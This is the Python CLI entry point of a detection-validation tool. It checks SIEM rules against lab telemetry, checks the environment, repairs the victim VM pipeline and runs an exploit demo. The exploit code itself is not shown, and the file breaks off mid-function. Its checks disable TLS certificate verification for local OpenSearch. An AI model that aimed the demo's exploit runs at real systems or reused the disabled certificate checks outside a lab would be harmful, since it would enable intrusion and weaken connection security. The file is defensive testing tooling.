"""Top-level CLI entry point."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import click
from rich.console import Console
from rich.table import Table

console = Console()
err_console = Console(stderr=True)


def _render_results(
    results: list,
    detections: list,
    elapsed: float,
    output: str,
    fmt: str,
) -> None:
    """Render RuleResult objects as a CLI table or JSON. Shared by validate and match."""
    if fmt == "json":
        out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout
        try:
            payload = [
                {
                    "rule_id": r.rule_id, "name": r.name,
                    "techniques": r.techniques, "siem": r.siem,
                    "query": r.query_desc, "hits": r.hit_count,
                    "status": r.status, "error": r.error,
                    "samples": r.sample_events[:1],
                }
                for r in results
            ]
            print(json.dumps(payload, indent=2, default=str), file=out)
        finally:
            if output != "-":
                out.close()
        return

    tbl = Table(show_header=True, header_style="bold", box=None, padding=(0, 1))
    tbl.add_column("Rule", style="white", max_width=38)
    tbl.add_column("Techniques", style="cyan", max_width=22)
    tbl.add_column("Hits", justify="right", width=5)
    tbl.add_column("Source", width=11)
    tbl.add_column("Status", width=8)

    likely_fires = kw_partial = no_kw_match = errors = skipped = 0
    covered_techniques: set[str] = set()

    _STATUS_DISPLAY: dict[str, tuple[str, str]] = {
        "likely_fires":     ("✓", "green"),
        "keyword_partial":  ("~", "yellow"),
        "no_keyword_match": ("✗", "red"),
        "error":            ("!", "yellow"),
        "skip":             ("–", "dim"),
    }

    for r in results:
        icon, style = _STATUS_DISPLAY.get(r.status, ("?", "white"))

        if r.status == "likely_fires":
            likely_fires += 1
            covered_techniques.update(r.techniques)
        elif r.status == "keyword_partial":
            kw_partial += 1
            covered_techniques.update(r.techniques)
        elif r.status == "no_keyword_match":
            no_kw_match += 1
        elif r.status == "error":
            errors += 1
        else:
            skipped += 1

        tech_str = ", ".join(r.techniques[:3]) + ("…" if len(r.techniques) > 3 else "")
        hit_str = str(r.hit_count) if r.status not in ("error", "skip") else "-"
        tbl.add_row(r.name[:38], tech_str, hit_str, r.siem, f"[{style}]{icon} {r.status.upper()}[/]")

        if r.status in ("likely_fires", "keyword_partial") and r.sample_events:
            ev = r.sample_events[0]
            snippet = (
                ev.get("proctitle") or ev.get("cmd_output") or
                ev.get("technique") or ev.get("key") or ""
            )
            if snippet:
                tbl.add_row(f"  [dim]{str(snippet)[:60]}[/]", "", "", "", "")

        if r.status == "error" and r.error:
            tbl.add_row(f"  [yellow]{r.error[:70]}[/]", "", "", "", "")

    console.print(tbl)
    console.print()

    total = len(results)
    console.print(
        f"[bold]Results:[/] {total} rule(s)  "
        f"[green]{likely_fires} LIKELY_FIRES[/]  "
        f"[yellow]{kw_partial} KEYWORD_PARTIAL[/]  "
        f"[red]{no_kw_match} NO_KEYWORD_MATCH[/]  "
        f"[yellow]{errors} ERROR[/]  [dim]{skipped} SKIP[/]  "
        f"({elapsed:.1f}s)"
    )
    if covered_techniques:
        console.print(
            f"[bold]Covered techniques:[/] [green]{', '.join(sorted(covered_techniques))}[/]"
        )

    if output != "-":
        with open(output, "w", encoding="utf-8") as fh:
            for det in detections:
                print(det.model_dump_json(), file=fh)
        err_console.print(f"\n[green]✓[/] Updated detections written to [bold]{output}[/]")


# ── Local docker-compose helpers ──────────────────────────────────────────────

def _local_compose_file() -> Path:
    """Return the path to docker/opensearch/docker-compose.yml in the repo."""
    return Path(__file__).parents[2] / "docker" / "opensearch" / "docker-compose.yml"


def _docker_check() -> str | None:
    """Return a friendly error string if Docker isn't usable, else None."""
    import subprocess as _sp
    try:
        r = _sp.run(["docker", "info"], capture_output=True, text=True, timeout=8)
        if r.returncode == 0:
            return None
        return (
            "Docker daemon is not running — start Docker Desktop and try again.\n"
            "  Install: https://docs.docker.com/get-started/get-docker/"
        )
    except FileNotFoundError:
        return (
            "Docker is not installed.\n"
            "  Install Docker Desktop: https://docs.docker.com/get-started/get-docker/"
        )
    except Exception as exc:
        return f"Docker check failed: {exc}"


def _docker_compose_run(args: list[str], timeout: int = 120) -> tuple[int, str]:
    """Shell out to 'docker compose' (plugin) or 'docker-compose' (legacy).

    Returns (returncode, combined stdout+stderr).
    """
    import subprocess as _sp
    compose = str(_local_compose_file())
    for prefix in (["docker", "compose"], ["docker-compose"]):
        try:
            r = _sp.run(
                prefix + ["-f", compose] + args,
                capture_output=True, text=True, timeout=timeout,
            )
            return r.returncode, (r.stdout + r.stderr).strip()
        except FileNotFoundError:
            continue
        except _sp.TimeoutExpired:
            return 1, "docker compose timed out"
    return 127, (
        "docker compose not found — install Docker Desktop "
        "(https://docs.docker.com/get-started/get-docker/)"
    )


# ── SIEM registry helpers ──────────────────────────────────────────────────────

def _registry_path() -> Path:
    return Path.home() / ".detectionvalidator" / "siems.yaml"


def _load_registry() -> list[dict]:
    p = _registry_path()
    if not p.exists():
        return []
    try:
        import yaml as _yaml
        data = _yaml.safe_load(p.read_text(encoding="utf-8")) or {}
        return data.get("siems", []) or []
    except Exception:
        return []


def _find_siem(name: str) -> "dict | None":
    for s in _load_registry():
        if s.get("name") == name:
            return s
    return None


def _save_registry(entries: list[dict]) -> None:
    p = _registry_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    import yaml as _yaml
    p.write_text(_yaml.dump({"siems": entries}, default_flow_style=False), encoding="utf-8")


def _siem_to_engine_kwargs(cfg: dict) -> dict:
    """Convert a registry SIEM entry to validate_corpus keyword arguments."""
    siem_type = cfg.get("type", "opensearch")
    url = cfg.get("url", "https://localhost:9200").rstrip("/")
    index = cfg.get("index", "dv-telemetry-*")
    if siem_type in ("opensearch", "elasticsearch"):
        return {
            "siem": siem_type,
            "os_host": url,
            "os_user": cfg.get("username", "admin"),
            "os_pass": cfg.get("password", ""),
            "os_index": index,
        }
    if siem_type == "splunk":
        return {
            "siem": "splunk",
            "splunk_hec": url,
            "splunk_token": cfg.get("token", ""),
        }
    return {"siem": siem_type}


# ── CLI groups ─────────────────────────────────────────────────────────────────

@click.group()
@click.version_option(package_name="detection-validator")
def main() -> None:
    """Detection Validator — multi-SIEM detection validation platform."""


@main.command()
@click.argument("rules", required=False, default=".")
@click.option("--siem", default="opensearch", show_default=True,
              help="SIEM backend(s): opensearch, splunk, or opensearch,splunk")
@click.option("--since", default=24.0, show_default=True,
              help="Only match telemetry from the last N hours (0 = all time).")
@click.option("--index", default="dv-telemetry-*", show_default=True,
              help="OpenSearch index pattern to query.")
@click.option("--output", "-o", default="-", show_default=True,
              help="Write updated JSONL (with validation_status) to this file (- = stdout).")
@click.option("--format", "fmt", default="cli", show_default=True,
              type=click.Choice(["cli", "json"]))
def validate(rules: str, siem: str, since: float, index: str, output: str, fmt: str) -> None:
    """Validate detection rules against live SIEM telemetry.

    Loads every rule under RULES (file or directory), translates each one to a
    live query against OpenSearch / Splunk, and reports whether the rule fired.

    \b
    Workflow:
      dv attack --cve CVE-2021-44228 --target vagrant --agent-port 9098
      dv validate examples/detections/sigma/ --since 1
      dv validate examples/detections/sigma/ --siem opensearch,splunk

    \b
    A rule PASSES if the SIEM returns ≥1 hit matching either:
      • the technique IDs declared in the rule's ATT&CK tags, OR
      • keywords from the rule's detection section found in proctitle / cmd_output.
    """
    import time as _time

    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from detection_validator.validator.engine import validate_corpus, RuleResult
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from pathlib import Path as _Path

    registry = ParserRegistry()
    root = _Path(rules)

    files = [root] if root.is_file() else sorted(f for f in root.rglob("*") if f.is_file())
    detections = []
    for fp in files:
        try:
            parser = registry.find_parser(fp)
            if parser is None:
                continue
            detections.append(parser.parse_file(fp))
        except (ParseError, Exception):
            continue

    if not detections:
        err_console.print(f"[red]No parseable rules found in:[/] {rules}")
        raise SystemExit(1)

    # Check if --siem is a registry name; if so, use its stored credentials
    siem_cfg = _find_siem(siem)
    if siem_cfg is not None:
        engine_kwargs = _siem_to_engine_kwargs(siem_cfg)
        siem_label = f"{siem} ({siem_cfg.get('type','?')}  {siem_cfg.get('url','')})"
    else:
        engine_kwargs = {"siem": siem, "os_index": index}
        siem_label = siem

    err_console.print(f"[cyan]Loaded {len(detections)} rule(s)[/]  siem={siem_label}  since={since}h\n")

    t0 = _time.time()
    with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                  transient=True, console=err_console) as prog:
        prog.add_task(f"Querying {siem_label}…", total=None)
        results: list[RuleResult] = validate_corpus(
            detections, since_hours=since, **engine_kwargs,
        )
    elapsed = _time.time() - t0

    _render_results(results, detections, elapsed, output, fmt)


@main.command()
@click.argument("rules", required=False, default=".")
@click.option("--events", "-e", "events_file", required=True,
              type=click.Path(exists=True),
              help="JSONL event file to match against (e.g. audit-events.jsonl).")
@click.option("--since", default=24.0, show_default=True,
              help="Only match events from the last N hours (0 = all events).")
@click.option("--output", "-o", default="-", show_default=True,
              help="Write updated JSONL (with validation_status) to this file (- = stdout).")
@click.option("--format", "fmt", default="cli", show_default=True,
              type=click.Choice(["cli", "json"]))
def match(rules: str, events_file: str, since: float, output: str, fmt: str) -> None:
    """Match detection rules against a local JSONL event file (no SIEM needed).

    Evaluates each rule in RULES against events in the JSONL file using the
    same two-layer strategy as 'dv validate' (technique field + keyword tokens),
    but entirely in-memory without querying a live SIEM.

    Useful for CI pipelines, offline analysis, or replaying captured events.
    Output is identical to 'dv validate' and pipes into 'dv report'.

    \b
    Workflow:
      # Export events from the Vagrant VM
      vagrant ssh -c "cat /var/log/audit/audit-events.jsonl" > events.jsonl

      # Or export from OpenSearch via curl
      curl -sk -u admin:"$OPENSEARCH_INITIAL_ADMIN_PASSWORD" \\
        "https://localhost:9200/dv-telemetry-*/_search?size=1000" \\
        -H 'Content-Type: application/json' \\
        -d '{"query":{"match_all":{}}}' \\
        | python3 -c "import json,sys; [print(json.dumps(h['_source'])) for h in json.load(sys.stdin)['hits']['hits']]" \\
        > events.jsonl

      # Match and report offline
      dv match --events events.jsonl examples/detections/sigma/
      dv match --events events.jsonl examples/detections/sigma/ --format json | dv report --format html -o report.html
    """
    import time as _time

    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from detection_validator.validator.matcher import match_corpus
    from pathlib import Path as _Path

    registry = ParserRegistry()
    root = _Path(rules)
    events_path = _Path(events_file)

    files = [root] if root.is_file() else sorted(f for f in root.rglob("*") if f.is_file())
    detections = []
    for fp in files:
        try:
            parser = registry.find_parser(fp)
            if parser is None:
                continue
            detections.append(parser.parse_file(fp))
        except (ParseError, Exception):
            continue

    if not detections:
        err_console.print(f"[red]No parseable rules found in:[/] {rules}")
        raise SystemExit(1)

    err_console.print(
        f"[cyan]Loaded {len(detections)} rule(s)[/]  "
        f"events={events_path.name}  since={since}h\n"
    )

    t0 = _time.time()
    results = match_corpus(detections, events_path, since_hours=since)
    elapsed = _time.time() - t0

    _render_results(results, detections, elapsed, output, fmt)


@main.command()
@click.option("--results", "-r", "results_file", default="-",
              help="JSON results file from 'dv validate --format json' (- = stdin).")
@click.option("--format", "fmt", default="cli", show_default=True,
              type=click.Choice(["cli", "json", "sarif", "html"]))
@click.option("--output", "-o", default="-", show_default=True,
              help="Output file path (- for stdout).")
@click.option("--html", "do_html", is_flag=True, default=False,
              help="Generate a comprehensive posture report to reports/detectval-report.html "
                   "(lint + gaps + SIEM queries — no running SIEM needed).")
@click.option("--open", "do_open", is_flag=True, default=False,
              help="Open the HTML report in the default browser after writing (requires --html).")
@click.option("--rules-dir", "rules_dir", default="examples/detections/sigma", show_default=True,
              type=click.Path(), help="Rules directory scanned when --html is passed.")
def report(results_file: str, fmt: str, output: str,
           do_html: bool, do_open: bool, rules_dir: str) -> None:
    """Generate a validation report from 'dv validate --format json' output.

    With --html, skips the JSON input entirely and builds a comprehensive
    posture report directly from the rules directory (lint + gaps + SIEM
    queries).  No running OpenSearch or Vagrant is required.

    \b
    Examples:
      # Pipe directly from validate
      dv validate examples/detections/sigma/ --format json | dv report

      # Comprehensive posture report (no SIEM needed)
      dv report --html
      dv report --html --open
      dv report --html --rules-dir path/to/rules

      # Save results then render as HTML
      dv validate examples/detections/sigma/ --format json -o results.json
      dv report --results results.json --format html -o report.html

      # SARIF for GitHub Code Scanning
      dv validate examples/detections/sigma/ --format json | dv report --format sarif -o scan.sarif
    """
    import json as _json
    import sys as _sys
    from pathlib import Path as _Path

    # ── Comprehensive HTML mode (--html) — no results JSON needed ─────────────
    if do_html:
        from detection_validator.reporters.html import gather_report_data, write_report

        rd = _Path(rules_dir)
        if not rd.exists():
            err_console.print(f"[red]✗[/] Rules directory not found: {rd}")
            raise SystemExit(1)

        out_html = _Path("reports") / "detectval-report.html"

        with console.status("[cyan]Parsing rules, running lint + query generation…[/]"):
            data = gather_report_data(rd)

        write_report(data, out_html)
        console.print(
            f"\n  [green]✓[/]  Report written to [bold]{out_html}[/]\n"
            f"  Posture score:  [{('green' if data.posture_score >= 70 else 'yellow' if data.posture_score >= 40 else 'red')}]"
            f"{data.posture_score:.0f}/100[/]\n"
            f"  Rules:          {len(data.rules)}\n"
            f"  Techniques:     {len(data.covered_techniques)}\n"
            f"  Priority gaps:  {len(data.gaps)}\n"
        )
        if not data.kb_available:
            console.print(
                "  [yellow]⚠[/]  ATT&CK heatmap + gap list unavailable.\n"
                "       Run [cyan]dv intel update --source attack[/] to enable them.\n"
            )
        if do_open:
            import webbrowser as _wb
            _wb.open(out_html.resolve().as_uri())
        return

    # ── Load results ──────────────────────────────────────────────────────────
    try:
        if results_file == "-":
            raw = _sys.stdin.read()
        else:
            raw = _Path(results_file).read_text(encoding="utf-8")
        results: list[dict] = _json.loads(raw)
        if not isinstance(results, list):
            raise ValueError("Expected a JSON array")
    except Exception as exc:
        err_console.print(f"[red]Failed to read results:[/] {exc}")
        err_console.print(
            "Run: [cyan]dv validate <rules> --format json[/] to generate results."
        )
        raise SystemExit(1)

    # ── Render ────────────────────────────────────────────────────────────────
    out_path = _Path(output) if output != "-" else None

    if fmt == "json":
        text = _json.dumps(results, indent=2, default=str)
        if out_path:
            out_path.write_text(text, encoding="utf-8")
            err_console.print(f"[green]✓[/] JSON written to [bold]{output}[/]")
        else:
            console.print(text)

    elif fmt == "sarif":
        from detection_validator.reporters.sarif import build as sarif_build
        sarif_doc = sarif_build(results)
        text = _json.dumps(sarif_doc, indent=2)
        if out_path:
            out_path.write_text(text, encoding="utf-8")
            n_fail = len([r for r in results if r.get("status") in ("fail", "error")])
            err_console.print(
                f"[green]✓[/] SARIF written to [bold]{output}[/]  "
                f"({n_fail} finding(s))"
            )
        else:
            console.print(text)

    elif fmt == "html":
        from detection_validator.reporters.html import build as html_build
        html_text = html_build(results)
        if out_path:
            out_path.write_text(html_text, encoding="utf-8")
            err_console.print(f"[green]✓[/] HTML report written to [bold]{output}[/]")
        else:
            console.print(html_text)

    else:  # cli
        from detection_validator.reporters.cli import report as cli_report
        from rich.console import Console as _Console
        if out_path:
            with open(out_path, "w", encoding="utf-8") as fh:
                cli_report(results, _Console(file=fh, highlight=False))
            err_console.print(f"[green]✓[/] Report written to [bold]{output}[/]")
        else:
            cli_report(results, console)


@main.command()
@click.option("--fix", is_flag=True, default=False,
              help="Attempt to automatically fix problems where possible.")
@click.option("--canary", is_flag=True, default=False,
              help="Emit a synthetic event through victim-agent and verify it lands in OpenSearch.")
def doctor(fix: bool, canary: bool) -> None:
    """Check that your environment is ready to run detection-validator.

    Verifies tool versions, Docker/Vagrant state, running containers,
    victim agent reachability, and local intelligence caches.

    \b
    Run this before your first use or when something isn't working:
      dv doctor
      dv doctor --fix      # auto-populate empty caches
      dv doctor --canary   # end-to-end telemetry roundtrip test
    """
    import os
    import shutil
    import subprocess
    import sys as _sys
    import ssl
    import urllib.request
    import urllib.error
    from pathlib import Path as _Path

    checks: list[tuple[str, str, str]] = []   # (icon, label, detail)
    errors = warnings = 0

    def ok(label: str, detail: str = "") -> None:
        checks.append(("✓", label, detail))

    def warn(label: str, detail: str = "") -> None:
        nonlocal warnings
        warnings += 1
        checks.append(("⚠", label, detail))

    def fail(label: str, detail: str = "") -> None:
        nonlocal errors
        errors += 1
        checks.append(("✗", label, detail))

    def run(*args: str) -> tuple[int, str]:
        try:
            r = subprocess.run(list(args), capture_output=True, text=True, timeout=10)
            return r.returncode, (r.stdout + r.stderr).strip()
        except FileNotFoundError:
            return 127, "not found"
        except Exception as exc:
            return 1, str(exc)

    def http_get(url: str, timeout: int = 4, verify_ssl: bool = True) -> tuple[int, str]:
        try:
            ctx = None
            if not verify_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(url, context=ctx, timeout=timeout) as resp:
                return resp.status, ""
        except urllib.error.HTTPError as exc:
            return exc.code, str(exc)
        except Exception as exc:
            return 0, str(exc)

    console.print("\n[bold]dv doctor[/] — environment pre-flight check\n")

    # ── Python ────────────────────────────────────────────────────────────────
    vi = _sys.version_info
    ver_str = f"{vi.major}.{vi.minor}.{vi.micro}"
    if vi >= (3, 12):
        ok(f"Python {ver_str}")
    else:
        fail(f"Python {ver_str}", "requires >= 3.12")

    # ── uv ───────────────────────────────────────────────────────────────────
    rc, out = run("uv", "--version")
    if rc == 0:
        ok(f"uv {out.split()[1] if len(out.split()) > 1 else out}")
    else:
        warn("uv not found", "install from https://docs.astral.sh/uv/")

    # ── Docker ────────────────────────────────────────────────────────────────
    rc, out = run("docker", "--version")
    if rc != 0:
        fail("Docker not found", "install Docker 24+")
    else:
        # extract version number
        ver = out.split("version ")[-1].split(",")[0].strip() if "version" in out else out
        major = int(ver.split(".")[0]) if ver[0].isdigit() else 0
        if major < 24:
            warn(f"Docker {ver}", "version 24+ recommended")
        else:
            ok(f"Docker {ver}")

        # daemon running?
        rc2, _ = run("docker", "info")
        if rc2 != 0:
            fail("Docker daemon not running", "start Docker Desktop or systemctl start docker")
        else:
            ok("Docker daemon running")

        # detectval-lab network
        rc3, nets = run("docker", "network", "ls", "--format", "{{.Name}}")
        if "detectval-lab" in nets.splitlines():
            ok("Docker network detectval-lab")
        else:
            warn("Docker network detectval-lab missing",
                 "run: ./dv up lab --siem opensearch --profile tiny")

    # ── Vagrant ───────────────────────────────────────────────────────────────
    rc, out = run("vagrant", "--version")
    if rc != 0:
        warn("Vagrant not found", "install Vagrant + vagrant-qemu for real auditd telemetry")
    else:
        ver = out.split()[-1] if out else "?"
        ok(f"Vagrant {ver}")

        # vagrant-qemu plugin
        rc2, plugins = run("vagrant", "plugin", "list")
        if "vagrant-qemu" in plugins:
            ok("Vagrant plugin vagrant-qemu")
        else:
            warn("vagrant-qemu plugin missing", "run: vagrant plugin install vagrant-qemu")

        # VM status — must run from the vagrant/ dir so Vagrant finds the Vagrantfile
        vagrant_dir = _Path(__file__).parents[2] / "vagrant"
        if vagrant_dir.exists():
            try:
                r = subprocess.run(
                    ["vagrant", "status", "--machine-readable"],
                    capture_output=True, text=True, timeout=15,
                    cwd=vagrant_dir,
                )
                status = (r.stdout + r.stderr).strip()
                if "running" in status:
                    ok("Vagrant VM running")
                else:
                    warn("Vagrant VM not running", "run: cd vagrant && vagrant up")
            except Exception as exc:
                warn("Vagrant VM status unknown", str(exc)[:60])
        else:
            warn("vagrant/ directory not found", "expected at project root")

    # ── SIEM containers ───────────────────────────────────────────────────────
    os_pass = os.environ.get("OPENSEARCH_INITIAL_ADMIN_PASSWORD", "")
    if not os_pass:
        warn("OPENSEARCH_INITIAL_ADMIN_PASSWORD not set",
             "export OPENSEARCH_INITIAL_ADMIN_PASSWORD=<your-password>")
    else:
        ok("OPENSEARCH_INITIAL_ADMIN_PASSWORD set")

    # OpenSearch — try HTTP first (security disabled in lab config), fallback to HTTPS
    import base64 as _b64
    creds = _b64.b64encode(f"admin:{os_pass}".encode()).decode() if os_pass else ""
    _os_reached = False
    for _scheme in ("http", "https"):
        try:
            _ctx = None
            if _scheme == "https":
                _ctx = ssl.create_default_context()
                _ctx.check_hostname = False
                _ctx.verify_mode = ssl.CERT_NONE
            _req = urllib.request.Request(
                f"{_scheme}://localhost:9200",
                headers={"Authorization": f"Basic {creds}"} if creds else {},
            )
            with urllib.request.urlopen(_req, context=_ctx, timeout=4) as resp:
                ok(f"OpenSearch reachable ({_scheme.upper()} {resp.status})")
                _os_reached = True
                break
        except urllib.error.HTTPError as exc:
            if exc.code in (401, 403):
                warn("OpenSearch reachable but auth failed",
                     "check OPENSEARCH_INITIAL_ADMIN_PASSWORD")
                _os_reached = True
                break
        except Exception:
            continue  # try next scheme
    if not _os_reached:
        fail("OpenSearch not reachable", "run: ./dv up lab --siem opensearch --profile tiny")

    # Splunk mock
    code, detail = http_get("http://localhost:8000", timeout=3)
    if code in range(200, 400):
        ok(f"Splunk mock reachable (HTTP {code})")
    elif code == 0:
        warn("Splunk mock not reachable", "run: ./dv up lab --siem splunk")
    else:
        warn(f"Splunk mock HTTP {code}", detail[:80])

    # ── Victim agent ─────────────────────────────────────────────────────────
    for port, label in [("9098", "Vagrant"), ("9099", "Docker")]:
        code, detail = http_get(f"http://localhost:{port}/health", timeout=3)
        if code in range(200, 400):
            ok(f"Victim agent reachable on port {port} ({label})")
            break
    else:
        warn("Victim agent not reachable on 9098 or 9099",
             "start VM: cd vagrant && vagrant up  OR  ./dv up lab")

    # ── Intelligence caches ───────────────────────────────────────────────────
    try:
        from detection_validator.mappers.attack_mapper import AttackKnowledgeBase
        kb = AttackKnowledgeBase()
        if kb._is_cache_valid():
            kb.ensure_loaded()
            ok(f"ATT&CK KB: {len(kb._techniques)} techniques")
        else:
            msg = "run: dv intel update --source attack"
            if fix:
                warn("ATT&CK cache empty — downloading…", "")
                try:
                    kb.ensure_loaded(force_refresh=True)
                    ok(f"ATT&CK KB: {len(kb._techniques)} techniques (just downloaded)")
                except Exception as exc:
                    fail("ATT&CK cache download failed", str(exc)[:80])
            else:
                warn("ATT&CK cache empty or stale", msg)
    except Exception as exc:
        warn("ATT&CK KB unavailable", str(exc)[:80])

    try:
        from detection_validator.mappers.cve_mapper import CVEKnowledgeBase, _DEFAULT_CACHE_DIR as _CVE_CACHE
        kev_file = _CVE_CACHE / "kev.json"
        if kev_file.exists():
            import json as _json
            kev = _json.loads(kev_file.read_text(encoding="utf-8"))
            count = len(kev.get("vulnerabilities", kev)) if isinstance(kev, dict) else len(kev)
            ok(f"KEV cache: {count} entries")
        else:
            msg = "run: dv intel update --source cve"
            if fix:
                warn("KEV cache empty — downloading…", "")
                try:
                    kb2 = CVEKnowledgeBase()
                    kb2.update(force=True)
                    ok("KEV cache downloaded")
                except Exception as exc:
                    fail("KEV cache download failed", str(exc)[:80])
            else:
                warn("KEV cache empty", msg)
    except Exception as exc:
        warn("CVE KB unavailable", str(exc)[:80])

    # ── Canary: end-to-end telemetry roundtrip ───────────────────────────────
    if canary:
        import json as _json
        import time as _time
        import uuid as _uuid

        canary_id = f"dv-canary-{_uuid.uuid4().hex[:12]}"
        agent_url = "http://localhost:9098/simulate"
        payload = {
            "technique": "DV_CANARY",
            "key": "dv_canary",
            "exe": "/usr/bin/dv_canary",
            "uid": "0",
            "event_type": "SYSCALL",
            "extra": {"cmd_output": canary_id, "canary_id": canary_id},
        }
        data = _json.dumps(payload).encode()
        req = urllib.request.Request(
            agent_url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        emit_ok = False
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                if resp.status == 200:
                    emit_ok = True
                    ok("Canary emitted to victim-agent", f"id={canary_id}")
                else:
                    fail("Canary emit failed", f"HTTP {resp.status}")
        except Exception as exc:
            fail("Canary emit failed", str(exc)[:80])

        if emit_ok:
            # Poll OpenSearch for the canary by canary_id.
            # match_phrase, not match — hyphens tokenize and would match any past canary.
            query = _json.dumps({
                "query": {"match_phrase": {"canary_id": canary_id}},
                "size": 1,
            }).encode()
            found_after = None
            for _scheme in ("https", "http"):
                _ctx = None
                if _scheme == "https":
                    _ctx = ssl.create_default_context()
                    _ctx.check_hostname = False
                    _ctx.verify_mode = ssl.CERT_NONE
                start = _time.time()
                deadline = start + 20.0
                last_err = ""
                while _time.time() < deadline:
                    try:
                        _req = urllib.request.Request(
                            f"{_scheme}://localhost:9200/dv-telemetry-*/_search",
                            data=query,
                            headers={
                                "Content-Type": "application/json",
                                "Authorization": f"Basic {creds}" if creds else "",
                            },
                            method="POST",
                        )
                        with urllib.request.urlopen(_req, context=_ctx, timeout=4) as resp:
                            body = _json.loads(resp.read())
                            total = body.get("hits", {}).get("total", {})
                            n = total.get("value", 0) if isinstance(total, dict) else int(total)
                            if n > 0:
                                found_after = _time.time() - start
                                break
                    except Exception as exc:
                        last_err = str(exc)[:80]
                    _time.sleep(1)
                if found_after is not None:
                    ok(f"Canary roundtrip {found_after:.1f}s", f"scheme={_scheme}")
                    break
            else:
                fail("Canary not found in OpenSearch within 20s",
                     "pipeline stuck — see dv repair")
                # Auto-diagnose: which stage broke?
                vagrant_dir = _Path(__file__).parents[2] / "vagrant"
                for cmd, label in [
                    (["sudo", "auditctl", "-s"], "auditd status"),
                    (["sudo", "systemctl", "is-active", "victim-agent", "vector"], "service status"),
                    (["sudo", "journalctl", "-u", "vector", "--no-pager", "--since",
                      "5 minutes ago"], "vector logs"),
                ]:
                    try:
                        r = subprocess.run(
                            ["vagrant", "ssh", "-c", " ".join(cmd)],
                            capture_output=True, text=True, timeout=10,
                            cwd=vagrant_dir,
                        )
                        out = (r.stdout + r.stderr).strip()
                        # Surface only the relevant lines
                        if "auditd" in label:
                            for line in out.splitlines():
                                if "enabled" in line:
                                    warn(f"diagnose: {label}", line.strip()[:80])
                                    break
                        elif "service" in label:
                            warn(f"diagnose: {label}", out.replace("\n", " ")[:80])
                        else:
                            err_lines = [l for l in out.splitlines() if "error" in l.lower() or "warn" in l.lower()]
                            if err_lines:
                                warn(f"diagnose: {label}", err_lines[-1][:80])
                    except Exception as exc:
                        warn(f"diagnose: {label}", f"could not collect: {str(exc)[:60]}")

    # ── Print results ─────────────────────────────────────────────────────────
    console.print()
    for icon, label, detail in checks:
        style = {"✓": "green", "⚠": "yellow", "✗": "red"}[icon]
        detail_str = f"  [dim]{detail}[/]" if detail else ""
        console.print(f"  [{style}]{icon}[/] {label}{detail_str}")

    console.print()
    if errors == 0 and warnings == 0:
        console.print("[bold green]All checks passed.[/]")
    elif errors == 0:
        console.print(
            f"[bold yellow]{warnings} warning(s)[/] — environment usable but not fully configured."
        )
    else:
        console.print(
            f"[bold red]{errors} error(s)[/]  [yellow]{warnings} warning(s)[/]"
            " — fix errors before running dv attack / dv validate."
        )
        raise SystemExit(1)


@main.command()
def repair() -> None:
    """Reset the Vagrant VM pipeline to a known-good state.

    SSH's into the victim VM and:
      1. Re-enables auditd event collection (auditctl -e 1)
      2. Restarts victim-agent (re-attaches to current audit.log after rotation)
      3. Restarts Vector (clears stuck retry loops)

    Run this when `dv doctor --canary` fails. Idempotent — safe to re-run.
    """
    import subprocess
    from pathlib import Path as _Path

    vagrant_dir = _Path(__file__).parents[2] / "vagrant"
    if not vagrant_dir.exists():
        err_console.print(f"[red]✗[/] vagrant/ directory not found at {vagrant_dir}")
        raise SystemExit(1)

    steps = [
        ("Re-enable auditd event collection", "sudo auditctl -e 1"),
        ("Restart victim-agent",              "sudo systemctl restart victim-agent"),
        ("Restart Vector",                    "sudo systemctl restart vector"),
    ]
    failed = 0
    for label, cmd in steps:
        console.print(f"  ▶  {label}…", end="")
        try:
            r = subprocess.run(
                ["vagrant", "ssh", "-c", cmd],
                capture_output=True, text=True, timeout=30,
                cwd=vagrant_dir,
            )
            if r.returncode == 0:
                console.print(" [green]✓[/]")
            else:
                failed += 1
                err_text = (r.stderr or r.stdout).strip().splitlines()
                console.print(f" [red]✗[/]  {err_text[-1] if err_text else '?'}")
        except subprocess.TimeoutExpired:
            failed += 1
            console.print(" [red]✗[/]  timeout")
        except Exception as exc:
            failed += 1
            console.print(f" [red]✗[/]  {exc}")

    console.print()
    if failed == 0:
        console.print("[bold green]Repair complete.[/]  Run [bold]dv doctor --canary[/] to verify.")
    else:
        console.print(f"[bold red]{failed} step(s) failed.[/]")
        raise SystemExit(1)


@main.command()
@click.option("--cve", default="CVE-2021-44228", show_default=True,
              help="CVE to exploit in the demo.")
@click.option("--rules", default="examples/detections/sigma/", show_default=True,
              help="Sigma rules directory to validate.")
@click.option("--profile", default="tiny", show_default=True,
              help="Docker stack resource profile (tiny/standard/full).")
def demo(cve: str, rules: str, profile: str) -> None:
    """One-shot demo: bring up the stack, run an exploit, validate rules.

    Starts the Docker stack (OpenSearch) and Vagrant VM if not running,
    runs the canary check (auto-repairs if needed), fires the exploit,
    waits for Vector to flush, then validates the Sigma rule corpus.

    \b
    Examples:
      dv demo
      dv demo --cve CVE-2021-26855
      dv demo --rules examples/detections/sigma/ --profile standard
    """
    import subprocess
    import sys as _sys
    import time as _time
    import socket as _socket
    from pathlib import Path as _Path

    REPO = _Path(__file__).parents[2]
    VAGRANT_DIR = REPO / "vagrant"

    def _run(cmd: list, cwd=None, check: bool = True) -> subprocess.CompletedProcess:
        console.print(f"[dim]$ {' '.join(str(c) for c in cmd)}[/]")
        return subprocess.run(cmd, cwd=str(cwd or REPO), check=check)

    def _port_open(port: int) -> bool:
        s = _socket.socket()
        s.settimeout(1)
        try:
            s.connect(("127.0.0.1", port))
            return True
        except Exception:
            return False
        finally:
            s.close()

    # ── 1: Docker stack ───────────────────────────────────────────────────────
    console.print("\n[bold cyan]▶ Step 1/6  Docker stack[/]")
    _run(["./dv", "up", "lab", "--siem", "opensearch", "--profile", profile])

    # ── 2: Vagrant VM ─────────────────────────────────────────────────────────
    console.print("\n[bold cyan]▶ Step 2/6  Vagrant VM[/]")
    r = subprocess.run(
        ["vagrant", "status", "--machine-readable"],
